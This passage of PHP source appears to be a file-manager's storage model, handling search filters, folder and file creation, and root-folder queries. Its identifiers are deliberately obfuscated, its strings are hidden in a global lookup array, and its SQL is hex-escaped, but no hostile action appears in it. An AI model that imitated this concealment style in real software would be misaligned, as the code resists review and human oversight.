= array(); $ô’˜¹¨‹ = $…ˆºÂÛì[$ÉÈ¨ûìß[2067]]; foreach ($±…Íœãà[$ÉÈ¨ûìß[457]] as $Â¬Ş˜©ş) { $õÆÇ×Ïâ = $Â¬Ş˜©ş[$ÉÈ¨ûìß[32]]; $æôËŞĞÓ = str_replace($ÉÈ¨ûìß[53], $ÉÈ¨ûìß[12], Pinyin::get($õÆÇ×Ïâ)); if (stripos($õÆÇ×Ïâ, $ô’˜¹¨‹) !== !1 || stripos($æôËŞĞÓ, $ô’˜¹¨‹) !== !1) { $Ô°ë¢öå[] = $Â¬Ş˜©ş[$ÉÈ¨ûìß[487]]; } } if (!$Ô°ë¢öå) { return; } $çû¦óà = array($ÉÈ¨ûìß[512] => array($ÉÈ¨ûìß[7], $Ô°ë¢öå), $ÉÈ¨ûìß[1768] => 0, $ÉÈ¨ûìß[33] => $ÉÈ¨ûìß[2089] . $ãÑÃ‡ŒÃ); $ŠÜıšµ = Model($ÉÈ¨ûìß[514])->field($ÉÈ¨ûìß[98])->where($çû¦óà)->select(); $ŠÜıšµ = array_to_keyvalue($ŠÜıšµ, $ÉÈ¨ûìß[12], $ÉÈ¨ûìß[98]); $ØÉ¯¿…ü = array_unique($ŠÜıšµ); $this->_listSearchMerge($±íı´üÆ, $…ˆºÂÛì, $˜şÄ¤Úš, $ØÉ¯¿…ü); } private function _listSearchMerge(&$Å½ù›„, $ŒÙÉ¤Úˆ, $ÅŸ¹ÙÈ, $—ŒİŠ˜) { $×ß¾‰§Û =& $_SERVER[Ò°Ì”İ•]; if (!$—ŒİŠ˜) { return; } $´¦¡°ëÇ = array_to_keyvalue($Å½ù›„[$×ß¾‰§Û[457]], $×ß¾‰§Û[12], $×ß¾‰§Û[204]); $Š¢šü¾Ø = array_diff($—ŒİŠ˜, $´¦¡°ëÇ); if (!$Š¢šü¾Ø) { return; } $¥ñÅÏó‚ = array($×ß¾‰§Û[204] => array($×ß¾‰§Û[7], $Š¢šü¾Ø)); $›¢»­ö = $this->field($ÅŸ¹ÙÈ)->where($¥ñÅÏó‚)->select(); if (!$›¢»­ö) { return; } $ŠÙş‹»§ = array(); foreach ($›¢»­ö as $ˆªÈ¡ï) { if ($this->_listSearchFilter($ˆªÈ¡ï, $ŒÙÉ¤Úˆ)) { $ŠÙş‹»§[] = $ˆªÈ¡ï; } } $Å½ù›„[$×ß¾‰§Û[457]] = array_merge($ŠÙş‹»§, $Å½ù›„[$×ß¾‰§Û[457]]); $Å½ù›„[$×ß¾‰§Û[454]][$×ß¾‰§Û[455]] += count($ŠÙş‹»§); } private function _listSearchFilter($¥†Îô, $¼‚´õÉµ) { $ıœ‡¡ĞÊ =& $_SERVER[Ò°Ì”İ•]; $ÛÌ£ïò¾ = $¥†Îô[$ıœ‡¡ĞÊ[497]] == $ıœ‡¡ĞÊ[102]; if (!strstr($¥†Îô[$ıœ‡¡ĞÊ[596]], $ıœ‡¡ĞÊ[50] . $¼‚´õÉµ[$ıœ‡¡ĞÊ[203]] . $ıœ‡¡ĞÊ[50])) { return !1; } if (isset($¼‚´õÉµ[$ıœ‡¡ĞÊ[498]]) && $¼‚´õÉµ[$ıœ‡¡ĞÊ[498]] != $ıœ‡¡ĞÊ[849]) { if ($¼‚´õÉµ[$ıœ‡¡ĞÊ[498]] == $ıœ‡¡ĞÊ[89] && !$ÛÌ£ïò¾) { return !1; } if ($¼‚´õÉµ[$ıœ‡¡ĞÊ[498]] != $ıœ‡¡ĞÊ[89] && $ÛÌ£ïò¾) { return !1; } if (!strstr($¥†Îô[$ıœ‡¡ĞÊ[180]], $ıœ‡¡ĞÊ[50] . $¼‚´õÉµ[$ıœ‡¡ĞÊ[498]] . $ıœ‡¡ĞÊ[50])) { return !1; } } if (isset($¼‚´õÉµ[$ıœ‡¡ĞÊ[2239]]) && $¼‚´õÉµ[$ıœ‡¡ĞÊ[2239]] < $¥†Îô[$ıœ‡¡ĞÊ[90]]) { return !1; } if (isset($¼‚´õÉµ[$ıœ‡¡ĞÊ[2240]]) && $¼‚´õÉµ[$ıœ‡¡ĞÊ[2240]] > $¥†Îô[$ıœ‡¡ĞÊ[90]]) { return !1; } if (isset($¼‚´õÉµ[$ıœ‡¡ĞÊ[677]]) && $¼‚´õÉµ[$ıœ‡¡ĞÊ[677]] != $¥†Îô[$ıœ‡¡ĞÊ[541]]) { return !1; } return !0; } public function listSearchChildren($½›ÜÀƒ, $ü†å©‹Ã = 5000) { $é²†Ê =& $_SERVER[Ò°Ì”İ•]; $¬Ø©‡¦æ = array(); $ô³öÁ£® = $this->sourceInfo($½›ÜÀƒ); $Ä—µË²Ğ = array($é²†Ê[596] => array($é²†Ê[471], $ô³öÁ£®[$é²†Ê[596]] . $ô³öÁ£®[$é²†Ê[204]] . $é²†Ê[628])); $ÑÉØå™Ø = $this->field($é²†Ê[90])->where($Ä—µË²Ğ)->limit($ü†å©‹Ã + 1)->select(); $ÀÊŞØ»Í = is_array($ÑÉØå™Ø) ? count($ÑÉØå™Ø) : 0; if ($ÀÊŞØ»Í > $ü†å©‹Ã) { return $this->_listSearchChildrenNear($½›ÜÀƒ, $ü†å©‹Ã); } $¸¸µˆÀÕ = $this->field($é²†Ê[204])->where($Ä—µË²Ğ)->select(); $¬Ø©‡¦æ = array_to_keyvalue($¸¸µˆÀÕ, $é²†Ê[12], $é²†Ê[204]); return $¬Ø©‡¦æ; } private function _listSearchChildrenNear($ÊîÌ÷ë, $²ç€­¦) { $€ìÁ°¤· =& $_SERVER[Ò°Ì”İ•]; $ãí‰–Å = array(); $ùÍãàˆ = array($€ìÁ°¤·[203] => $ÊîÌ÷ë); $Ó¥îœÎ£ = $this->field($€ìÁ°¤·[2241])->where($ùÍãàˆ)->select(); $ÎÂ—†ÒÖ = array_to_keyvalue(array_filter_by_field($Ó¥îœÎ£, $€ìÁ°¤·[497], $€ìÁ°¤·[102]), $€ìÁ°¤·[12], $€ìÁ°¤·[204]); $ãí‰–Å = array_merge($ãí‰–Å, array_to_keyvalue($Ó¥îœÎ£, $€ìÁ°¤·[12], $€ìÁ°¤·[204])); if (!$ÎÂ—†ÒÖ) { return $ãí‰–Å; } $ùÍãàˆ = array($€ìÁ°¤·[203] => array($€ìÁ°¤·[7], $ÎÂ—†ÒÖ)); $Ó¥îœÎ£ = $this->field($€ìÁ°¤·[2241])->where($ùÍãàˆ)->limit($²ç€­¦)->select(); $ãí‰–Å = array_merge($ãí‰–Å, array_to_keyvalue($Ó¥îœÎ£, $€ìÁ°¤·[12], $€ìÁ°¤·[204])); $ãí‰–Å = array_slice($ãí‰–Å, 0, intval($²ç€­¦)); return $ãí‰–Å; } private function _listSearchBindPinyin($Ÿ®«©õ¤, &$±¬Æî¦, &$ô¤ÁÕô¼) { $°¬€€Å¦ =& $_SERVER[Ò°Ì”İ•]; if (!isset($Ÿ®«©õ¤[$°¬€€Å¦[2067]]) || !$Ÿ®«©õ¤[$°¬€€Å¦[2067]]) { return; } if (!Input::check($Ÿ®«©õ¤[$°¬€€Å¦[2067]], $°¬€€Å¦[405]) || strlen($Ÿ®«©õ¤[$°¬€€Å¦[2067]]) < 2) { return; } $Ç¨¦„¦“ = "\x4c\105\x46\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\137\163\157\165\x72\143\x65\x5f\155\145\x74\141\40\155\145\164\141\x20\157\156\x20\163\x6f\x75\162\x63\145\56\163\157\165\162\143\145\111\104\x20\75\x20\155\x65\164\141\x2e\163\x6f\x75\162\143\x65\x49\x44"; $ÙÌ‚Ï÷• = array(); $ô¤ÁÕô¼ = str_replace(array($°¬€€Å¦[59], $°¬€€Å¦[53], $°¬€€Å¦[2242]), $°¬€€Å¦[12], $ô¤ÁÕô¼); $ô¤ÁÕô¼ = $°¬€€Å¦[523] . str_replace($°¬€€Å¦[50], $°¬€€Å¦[524], $ô¤ÁÕô¼); $Áëèî¤ù = $±¬Æî¦[$°¬€€Å¦[32]]; unset($±¬Æî¦[$°¬€€Å¦[32]]); foreach ($±¬Æî¦ as $«•Âèò’ => $ßô†±ğ‹) { $ÙÌ‚Ï÷•[$°¬€€Å¦[523] . $«•Âèò’] = $ßô†±ğ‹; } foreach ($Áëèî¤ù as $¡­“ÜØ) { $ÙÌ‚Ï÷•[] = array($°¬€€Å¦[528] => $¡­“ÜØ, $°¬€€Å¦[1073] => $°¬€€Å¦[2071], array($°¬€€Å¦[2243] => $¡­“ÜØ, $°¬€€Å¦[2244] => array($°¬€€Å¦[7], array($°¬€€Å¦[550], $°¬€€Å¦[549])))); } $this->join($Ç¨¦„¦“); $±¬Æî¦ = $ÙÌ‚Ï÷•; } private function _parseSearchWhere($äÂ›¶÷¿) { $†’Ñ«€§ =& $_SERVER[Ò°Ì”İ•]; $‹®à¹ˆë = array(); if (isset($äÂ›¶÷¿[$†’Ñ«€§[833]]) && $äÂ›¶÷¿[$†’Ñ«€§[833]]) { $‹®à¹ˆë[$†’Ñ«€§[99]] = array($†’Ñ«€§[2245], $äÂ›¶÷¿[$†’Ñ«€§[833]]); } if (isset($äÂ›¶÷¿[$†’Ñ«€§[834]]) && $äÂ›¶÷¿[$†’Ñ«€§[834]]) { $á›Öñûš = array($†’Ñ«€§[2246], $äÂ›¶÷¿[$†’Ñ«€§[834]]); if ($‹®à¹ˆë[$†’Ñ«€§[99]]) { $‹®à¹ˆë[$†’Ñ«€§[99]] = array($‹®à¹ˆë[$†’Ñ«€§[99]], $á›Öñûš, $†’Ñ«€§[2247]); } else { $‹®à¹ˆë[$†’Ñ«€§[99]] = $á›Öñûš; } } if (isset($äÂ›¶÷¿[$†’Ñ«€§[2239]]) && $äÂ›¶÷¿[$†’Ñ«€§[2239]] > 0) { $‹®à¹ˆë[$†’Ñ«€§[90]] = array($†’Ñ«€§[2245], $äÂ›¶÷¿[$†’Ñ«€§[2239]]); } if (isset($äÂ›¶÷¿[$†’Ñ«€§[2240]]) && $äÂ›¶÷¿[$†’Ñ«€§[2240]]) { $á›Öñûš = array($†’Ñ«€§[2246], $äÂ›¶÷¿[$†’Ñ«€§[2240]]); if ($‹®à¹ˆë[$†’Ñ«€§[90]]) { $‹®à¹ˆë[$†’Ñ«€§[90]] = array($‹®à¹ˆë[$†’Ñ«€§[90]], $á›Öñûš, $†’Ñ«€§[2247]); } else { $‹®à¹ˆë[$†’Ñ«€§[90]] = $á›Öñûš; } } if (isset($äÂ›¶÷¿[$†’Ñ«€§[677]]) && $äÂ›¶÷¿[$†’Ñ«€§[677]]) { $‹®à¹ˆë[] = array($†’Ñ«€§[541] => $äÂ›¶÷¿[$†’Ñ«€§[677]], $†’Ñ«€§[539] => $äÂ›¶÷¿[$†’Ñ«€§[677]], $†’Ñ«€§[1073] => $†’Ñ«€§[2071]); } if (isset($äÂ›¶÷¿[$†’Ñ«€§[498]]) && $äÂ›¶÷¿[$†’Ñ«€§[498]]) { $·ˆÍİ»º = $äÂ›¶÷¿[$†’Ñ«€§[498]]; if ($·ˆÍİ»º == $†’Ñ«€§[89]) { $‹®à¹ˆë[$†’Ñ«€§[497]] = 1; } else { if ($·ˆÍİ»º == $†’Ñ«€§[2248]) { $‹®à¹ˆë[$†’Ñ«€§[497]] = 0; } else { if ($·ˆÍİ»º) { $·ˆÍİ»º = is_array($·ˆÍİ»º) ? $·ˆÍİ»º : explode($†’Ñ«€§[50], $·ˆÍİ»º); $‹®à¹ˆë[$†’Ñ«€§[498]] = array($†’Ñ«€§[504], $·ˆÍİ»º); $‹®à¹ˆë[$†’Ñ«€§[497]] = 0; } } } } $this->_parseSearchParent($äÂ›¶÷¿, $‹®à¹ˆë); if (isset($äÂ›¶÷¿[$†’Ñ«€§[2067]]) && trim($äÂ›¶÷¿[$†’Ñ«€§[2067]])) { $ñß ©úƒ = trim($äÂ›¶÷¿[$†’Ñ«€§[2067]]); $¦ä·ä¢ƒ = explode($†’Ñ«€§[53], $ñß ©úƒ); if (strlen($ñß ©úƒ) > 2 && (substr($ñß ©úƒ, 0, 1) == $†’Ñ«€§[132] && substr($ñß ©úƒ, -1) == $†’Ñ«€§[132]) || substr($ñß ©úƒ, 0, 1) == $†’Ñ«€§[68] && substr($ñß ©úƒ, -1) == $†’Ñ«€§[68]) { $ñß ©úƒ = substr($ñß ©úƒ, 1, -1); $¦ä·ä¢ƒ = array($ñß ©úƒ); } $‹®à¹ˆë[$†’Ñ«€§[32]] = array(array($†’Ñ«€§[627], $†’Ñ«€§[2069] . $ñß ©úƒ . $†’Ñ«€§[2069])); if (count($¦ä·ä¢ƒ) > 1) { $‹®à¹ˆë[$†’Ñ«€§[32]] = array(); foreach ($¦ä·ä¢ƒ as $æßÆºø¹) { if (!trim($æßÆºø¹)) { continue; } $‹®à¹ˆë[$†’Ñ«€§[32]][] = array($†’Ñ«€§[627], $†’Ñ«€§[2069] . trim($æßÆºø¹) . $†’Ñ«€§[2069]); } } } return $‹®à¹ˆë; } private function _parseSearchParent($†ëØ’¿, &$‡é›ÊÈÇ) { $ååš¨âÌ =& $_SERVER[Ò°Ì”İ•]; if (!isset($†ëØ’¿[$ååš¨âÌ[203]]) || !$†ëØ’¿[$ååš¨âÌ[203]]) { return; } $ ºÄï«¬ = $this->pathInfo($†ëØ’¿[$ååš¨âÌ[203]]); $î°£¦ëÏ = $ ºÄï«¬[$ååš¨âÌ[203]] . $ååš¨âÌ[12] === $ååš¨âÌ[241]; $Ó€‡¡‰ä = $ ºÄï«¬[$ååš¨âÌ[201]] == $ååš¨âÌ[590]; if ($ ºÄï«¬[$ååš¨âÌ[606]] == $ååš¨âÌ[607]) { $“öâø§Ç = $this->sourceInfo($†ëØ’¿[$ååš¨âÌ[203]]); $ ºÄï«¬[$ååš¨âÌ[596]] = $“öâø§Ç[$ååš¨âÌ[596]]; } $‡é›ÊÈÇ[$ååš¨âÌ[667]] = array($ååš¨âÌ[627], $ ºÄï«¬[$ååš¨âÌ[596]] . $†ëØ’¿[$ååš¨âÌ[203]] . $ååš¨âÌ[628]); $œ¿óìá = isset($†ëØ’¿[$ååš¨âÌ[1927]]) && in_array($ååš¨âÌ[590], $†ëØ’¿[$ååš¨âÌ[1927]]); if (!$œ¿óìá || !$Ó€‡¡‰ä || !$î°£¦ëÏ || !$ ºÄï«¬[$ååš¨âÌ[499]]) { return; } if (!AuthModel::authCheckRoot($ ºÄï«¬[$ååš¨âÌ[499]][$ååš¨âÌ[500]])) { return; } $ÍÂ…Ö—Í = $ ºÄï«¬[$ååš¨âÌ[581]] . $ååš¨âÌ[12]; if ($ÍÂ…Ö—Í == $ååš¨âÌ[102]) { unset($‡é›ÊÈÇ[$ååš¨âÌ[667]]); $‡é›ÊÈÇ[$ååš¨âÌ[201]] = self::TYPE_GROUP; return; } $‹Î…ÙìÄ = Model($ååš¨âÌ[597])->groupChildrenAll($ÍÂ…Ö—Í); $ê‘£Ú‘€ = count($‹Î…ÙìÄ); if ($ê‘£Ú‘€ <= 1) { return; } $ö¡Ë£†á = array($ååš¨âÌ[203] => 0, $ååš¨âÌ[201] => self::TYPE_GROUP, $ååš¨âÌ[581] => array($ååš¨âÌ[7], $‹Î…ÙìÄ)); $Ğ·åÉ¾¾ = $this->field($ååš¨âÌ[2249])->where($ö¡Ë£†á)->limit($ê‘£Ú‘€)->select(); $‡é›ÊÈÇ[$ååš¨âÌ[667]] = array(); foreach ($Ğ·åÉ¾¾ as $Ì¨„”´) { $‡é›ÊÈÇ[$ååš¨âÌ[667]][] = array($ååš¨âÌ[627], $ååš¨âÌ[605] . $Ì¨„”´[$ååš¨âÌ[204]] . $ååš¨âÌ[628]); } $‡é›ÊÈÇ[$ååš¨âÌ[667]][] = $ååš¨âÌ[2071]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($È±Šé´ø) { $ì„Ì‰Õ =& $_SERVER[Ò°Ì”İ•]; $—Ñûå±Õ = Model($ì„Ì‰Õ[589])->where(array($ì„Ì‰Õ[1759] => $È±Šé´ø))->find(); $Ê±¢Áª› = $this->_mkdirRoot(SourceModel::TYPE_USER, $È±Šé´ø, $—Ñûå±Õ[$ì„Ì‰Õ[32]]); $this->userDesktopAdd($Ê±¢Áª›); return $Ê±¢Áª›; } public function userDesktopAdd($éë·±‹Û) { $Êƒç¦Èİ =& $_SERVER[Ò°Ì”İ•]; $æÕ¼Ğ²É = LNG($Êƒç¦Èİ[2250]); $åª = $this->mkdir($éë·±‹Û, $æÕ¼Ğ²É); $this->metaSet($åª, $Êƒç¦Èİ[2251], $Êƒç¦Èİ[102]); $this->metaSet($éë·±‹Û, $Êƒç¦Èİ[2252], $åª); } public function userPathSafeAdd($àæÒÙ¯¶) { $„ÒëŒ¾© =& $_SERVER[Ò°Ì”İ•]; $Ä­ğü«ò = Model($„ÒëŒ¾©[589])->getInfoFull($àæÒÙ¯¶); if (!$Ä­ğü«ò) { return !1; } if (_get($Ä­ğü«ò, $„ÒëŒ¾©[610])) { return $Ä­ğü«ò[$„ÒëŒ¾©[551]][$„ÒëŒ¾©[2253]]; } $´­¥ëƒœ = $this->_mkdirRoot(SourceModel::TYPE_USER, $àæÒÙ¯¶, $„ÒëŒ¾©[2254], $„ÒëŒ¾©[2255]); Model($„ÒëŒ¾©[589])->metaSet($àæÒÙ¯¶, $„ÒëŒ¾©[2253], $´­¥ëƒœ); $this->metaSet($´­¥ëƒœ, $„ÒëŒ¾©[2256], $àæÒÙ¯¶); return $´­¥ëƒœ; } public function userPathAppAdd($³‘¤¯Ü©, $²ÉùÙö• = '', $ÆÔÅÔ£Û = '') { $ÌöøüÈ =& $_SERVER[Ò°Ì”İ•]; $Åıè‚ù— = Model($ÌöøüÈ[589])->getInfoFull($³‘¤¯Ü©); if (!$Åıè‚ù—) { return !1; } $ƒÉğİ½´ = $Åıè‚ù—[$ÌöøüÈ[551]] ? $Åıè‚ù—[$ÌöøüÈ[551]] : array(); $şˆ³š©˜ = $ƒÉğİ½´[$ÌöøüÈ[2257]]; if (!$şˆ³š©˜) { $şˆ³š©˜ = $this->_mkdirRoot(SourceModel::TYPE_USER, $³‘¤¯Ü©, $ÌöøüÈ[2258], $ÌöøüÈ[2259]); Model($ÌöøüÈ[589])->metaSet($³‘¤¯Ü©, $ÌöøüÈ[2257], $şˆ³š©˜ . $ÌöøüÈ[12]); $this->metaSet($şˆ³š©˜, $ÌöøüÈ[2257], $³‘¤¯Ü©); } if (!$²ÉùÙö•) { return $şˆ³š©˜; } $Úà…ƒŠı = $ƒÉğİ½´[$ÌöøüÈ[2260] . $²ÉùÙö•]; if (!$Úà…ƒŠı) { $Úà…ƒŠı = $this->mkdir($şˆ³š©˜, $²ÉùÙö•); Model($ÌöøüÈ[589])->metaSet($³‘¤¯Ü©, $ÌöøüÈ[2260] . $²ÉùÙö•, $Úà…ƒŠı); $this->metaSet($Úà…ƒŠı, $ÌöøüÈ[2260] . $²ÉùÙö•, $³‘¤¯Ü©); } if (!$ÆÔÅÔ£Û) { return $Úà…ƒŠı; } $øüÙÕñú = $this->mkdir($Úà…ƒŠı, $ÆÔÅÔ£Û); return $øüÙÕñú; } public function groupRootAdd($‚—´è®¼) { $Æª»Ú÷ò =& $_SERVER[Ò°Ì”İ•]; $õ´íÕ÷« = Model($Æª»Ú÷ò[597])->where(array($Æª»Ú÷ò[2061] => $‚—´è®¼))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $‚—´è®¼, $õ´íÕ÷«[$Æª»Ú÷ò[32]]); } public function systemRootPathAdd($ß­»ŞñÕ) { if ($ß­»ŞñÕ != $_SERVER[Ò°Ì”İ•][620]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ß­»ŞñÕ); } public function userRootRemove($Á½ûÍù‰) { $· ü§Ğø = $this->targetSourceRoot(SourceModel::TYPE_USER, $Á½ûÍù‰, !0); foreach ($· ü§Ğø as $¤…ÊÁ–®) { if (!$¤…ÊÁ–®) { continue; } $this->remove($¤…ÊÁ–®[$_SERVER[Ò°Ì”İ•][204]], !1); } } public function groupRootRemove($Úïæ¼“‹) { $µô×¤Ìâ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Úïæ¼“‹); if (!$µô×¤Ìâ) { return; } $this->remove($µô×¤Ìâ[$_SERVER[Ò°Ì”İ•][204]], !1); } private function _mkdirRoot($ü×‹×úæ, $»¶˜¤Ì´, $ †Î¸í›, $«ÅÄ¿êÚ = '') { $ˆŞöËÏÌ =& $_SERVER[Ò°Ì”İ•]; $Ò–•îş = defined($ˆŞöËÏÌ[2196]) ? USER_ID : 0; $’çÂâ€ù = array($ˆŞöËÏÌ[489] => 0, $ˆŞöËÏÌ[663] => $ü×‹×úæ, $ˆŞöËÏÌ[664] => $»¶˜¤Ì´, $ˆŞöËÏÌ[661] => 1, $ˆŞöËÏÌ[665] => $Ò–•îş, $ˆŞöËÏÌ[666] => $Ò–•îş, $ˆŞöËÏÌ[662] => $«ÅÄ¿êÚ, $ˆŞöËÏÌ[667] => $ˆŞöËÏÌ[605], $ˆŞöËÏÌ[516] => 0, $ˆŞöËÏÌ[632] => 0, $ˆŞöËÏÌ[554] => 0, $ˆŞöËÏÌ[668] => $ˆŞöËÏÌ[12]); if ($’±µ´€³ = $this->where($’çÂâ€ù)->find()) { return $’±µ´€³[$ˆŞöËÏÌ[204]]; } $ùŒõºÚ = "\x4d\x6f\144\145\x6c\x53\x6f\x75\162\x63\145\56\155\x6b\144\x69\162\x52\x6f\x6f\x74\56{$ü×‹×úæ}\x2e{$»¶˜¤Ì´}\56" . $ †Î¸í›; CacheLock::lock($ùŒõºÚ); $’çÂâ€ù[$ˆŞöËÏÌ[32]] = $ †Î¸í›; $åªê’Í¯ = $this->add($’çÂâ€ù); $¹êáë ¥ = array($ˆŞöËÏÌ[669] => short_id($åªê’Í¯)); $this->where(array($ˆŞöËÏÌ[503] => $åªê’Í¯))->save($¹êáë ¥); CacheLock::unlock($ùŒõºÚ); return $åªê’Í¯; } private function targetSourceRoot($’ÛÄªü¸, $Ô×»­…, $äáÙÈ× = false) { $ŞŠ¤Éûã =& $_SERVER[Ò°Ì”İ•]; $ó¢å½ÛÎ = array($ŞŠ¤Éûã[489] => 0, $ŞŠ¤Éûã[663] => $’ÛÄªü¸, $ŞŠ¤Éûã[664] => $Ô×»­…); if ($äáÙÈ×) { $£ºÇµ™é = $this->where($ó¢å½ÛÎ)->select(); return $£ºÇµ™é ? $£ºÇµ™é : array(); } $‘›Èíƒü = $this->where($ó¢å½ÛÎ)->find(); return $‘›Èíƒü ? $‘›Èíƒü : array(); } public function sourceRootGroup($”Ô³¤äÄ) { $‹ÕÙ¦çô =& $_SERVER[Ò°Ì”İ•]; if (is_string($”Ô³¤äÄ)) { $”Ô³¤äÄ = array($”Ô³¤äÄ); } $©¨ççó‘ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $”Ô³¤äÄ, $‹ÕÙ¦çô[233]); $ˆ¼ Ì¹ = array($‹ÕÙ¦çô[457] => $©¨ççó‘, $‹ÕÙ¦çô[454] => array($‹ÕÙ¦çô[831] => count($”Ô³¤äÄ))); $this->_listDataApply($ˆ¼ Ì¹[$‹ÕÙ¦çô[457]]); $this->_listMake($ˆ¼ Ì¹); return array_to_keyvalue($ˆ¼ Ì¹[$‹ÕÙ¦çô[96]], $‹ÕÙ¦çô[581]); } public function mkfile($É–‚ÂÇô, $Ï«ß¬¹„, $¡Ş†çÚ = '', $ÃÅ¾ğÕğ = REPEAT_RENAME) { $äÇáû¥á =& $_SERVER[Ò°Ì”İ•]; $œÁÔÚ„ = Model($äÇáû¥á[689])->addFileByContent($¡Ş†çÚ, $Ï«ß¬¹„); return $this->_createFileCall($É–‚ÂÇô, $Ï«ß¬¹„, $œÁÔÚ„, $ÃÅ¾ğÕğ, $äÇáû¥á[1427]); } public function addFile($Å†˜éŸ, $Æ±«Îşò, $àÇª„Å, $“Ê˜¡­ = false, $Ë½¢ÍïÔ = REPEAT_RENAME) { $õí­ÑÉ« = Model($_SERVER[Ò°Ì”İ•][689])->addFile($Æ±«Îşò, $àÇª„Å, $“Ê˜¡­); return $this->_createFileCall($Å†˜éŸ, $àÇª„Å, $õí­ÑÉ«, $Ë½¢ÍïÔ); } public function addFileByFileID($¸ÃŸñÏà, $¶ö×¨Çß, $êì±šË¹, $€ˆ™â— = REPEAT_RENAME) { $ğåÚŠéŒ =& $_SERVER[Ò°Ì”İ•]; $Å–ÙÈ£å = Model($ğåÚŠéŒ[689])->find($¶ö×¨Çß); Model($ğåÚŠéŒ[689])->linkAdd($¶ö×¨Çß); return $this->_createFileCall($¸ÃŸñÏà, $êì±šË¹, $Å–ÙÈ£å, $€ˆ™â—); } public function addFileByRemote($ş¯Çì½¦, $¤¶´‹œÌ, $óüâ ¬î, $²Œ¾Á § = array(), $ùÂ©áÔ = REPEAT_RENAME) { $‘†›Æ‹ş = Model($_SERVER[Ò°Ì”İ•][689])->addFileByRemote($¤¶´‹œÌ, $óüâ ¬î, $²Œ¾Á §); return $this->_createFileCall($ş¯Çì½¦, $óüâ ¬î, $‘†›Æ‹ş, $ùÂ©áÔ); } private function _createFileCall($­Ò´¿¬, $ó¼¼Ş, $Ç¨ğó±», $âœàï¼Ó, $Ñ‚Âõ¬ğ = "\x75\x70\x6c\x6f\141\x64") { $ÙßÕµò‡ =& $_SERVER[Ò°Ì”İ•]; $­şˆÂÖ = !1; $this->setMasterDB(); $this->lockWriteStart($­Ò´¿¬, $ó¼¼Ş); $ÉÔÎÂë€ = $this->fileNameExist($­Ò´¿¬, $ó¼¼Ş); $¨Ş·ü¦ƒ = $this->_createFile($­Ò´¿¬, $ó¼¼Ş, $Ç¨ğó±», $âœàï¼Ó, $­şˆÂÖ); if (!$­şˆÂÖ) { Model($ÙßÕµò‡[556])->remove($Ç¨ğó±»[$ÙßÕµò‡[553]]); } if ($­şˆÂÖ && $¨Ş·ü¦ƒ && $¨Ş·ü¦ƒ != $ÉÔÎÂë€) { Model($ÙßÕµò‡[2223])->eventCreate($¨Ş·ü¦ƒ, $Ñ‚Âõ¬ğ); } $this->lockWriteEnd($­Ò´¿¬, $ó¼¼Ş); return $¨Ş·ü¦ƒ; } public function mkdir($ïûú°, $«Í¶ğµÂ, $Ø­ìäÔß = REPEAT_SKIP) { $³çâ¾¹ =& $_SERVER[Ò°Ì”İ•]; $this->setMasterDB(); $¶Ø«´ò = $this->sourceInfo($ïûú°); if (!$¶Ø«´ò) { return !1; } $this->lockWriteStart($ïûú°, $«Í¶ğµÂ); if ($Ø­ìäÔß !== !1) { $¦¢á´ó¶ = $this->fileNameExist($ïûú°, $«Í¶ğµÂ); if ($¦¢á´ó¶ && $Ø­ìäÔß != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ïûú°, $«Í¶ğµÂ); return $¦¢á´ó¶; } $«Í¶ğµÂ = $this->fileNameAuto($ïûú°, $«Í¶ğµÂ, $Ø­ìäÔß); } $ÑìËö‡ = array($³çâ¾¹[661] => 1, $³çâ¾¹[506] => $«Í¶ğµÂ, $³çâ¾¹[662] => $³çâ¾¹[12], $³çâ¾¹[554] => 0, $³çâ¾¹[632] => 0); $ã‹ĞºÂ– = $this->_addSource($ÑìËö‡, $¶Ø«´ò); Model($³çâ¾¹[2223])->eventCreate($ã‹ĞºÂ–, $³çâ¾¹[1428]); $this->lockWriteEnd($ïûú°, $«Í¶ğµÂ); return $ã‹ĞºÂ–; } public function listSourceRoot($Ã®»Üã, $ÄÓÍåàÉ, $¢×ş‡ = "\163\x6f\165\x72\x63\x65\x49\104\54\164\x61\x72\x67\145\164\x49\x44\54\163\x69\x7a\145") { $€€ìó¹Ö =& $_SERVER[Ò°Ì”İ•]; $éÀå¤ø€ = $€€ìó¹Ö[466]; $¬—ñšş = array(); $Üøšš„Œ = 1024 * 50; $Œ…ôó¾í = is_array($Œ…ôó¾í) ? $Œ…ôó¾í : array(); $ÏÁš¨ˆƒ = count($ÄÓÍåàÉ); $é³±¾Šò = $this->tablePrefix . $€€ìó¹Ö[2261]; for ($Â¨ò¡£ù = 0; $Â¨ò¡£ù < $ÏÁš¨ˆƒ; $Â¨ò¡£ù++) { $®±àô‰¼ = $ÄÓÍåàÉ[$Â¨ò¡£ù]; $éÀå¤ø€ .= "\123\x45\114\105\103\x54\40\52\x20\x46\122\117\x4d\x20\x28\x53\x45\x4c\x45\103\124\40{$¢×ş‡}\x20\x46\x52\117\x4d\x20\x60{$é³±¾Šò}\140\x20\127\x48\105\122\x45\40"; $éÀå¤ø€ .= "\x60\160\141\x72\145\x6e\164\x49\x44\x60\75\x30\40\101\x4e\104\40\140\164\x61\162\147\x65\164\x49\x44\140\x3d{$®±àô‰¼}\40\x41\116\104\x20\140\164\x61\x72\147\145\164\x54\171\160\145\x60\75{$Ã®»Üã}\x20\x61\156\x64\40\146\x69\154\x65\124\171\160\x65\x3d\x27\47\x20\154\151\155\151\x74\x20\61\x29\40\141\x73\40\x74\x62\137{$Â¨ò¡£ù}\x20\125\116\111\117\116\x20\x41\x4c\x4c\40"; if ((strlen($éÀå¤ø€) >= $Üøšš„Œ || $Â¨ò¡£ù == $ÏÁš¨ˆƒ - 1) && $éÀå¤ø€) { $éÀå¤ø€ = substr($éÀå¤ø€, 0, -strlen($€€ìó¹Ö[1111])); $¡ÆøÏÍ = $this->query($éÀå¤ø€); $éÀå¤ø€ = $€€ìó¹Ö[12]; $¬—ñšş = array_merge($¬—ñšş, $¡ÆøÏÍ); } } return $¬—ñšş; } private function _createFile($„‹ìüÍ, $˜´ô›À, $ĞÛÔ­µ›, $º›Ô¾î, &$êÀã¦”) { $»–¼ÖÖ  =& $_SERVER[Ò°Ì”İ•]; $€¨ş¹Œ = $this->sourceInfo($„‹ìüÍ); if 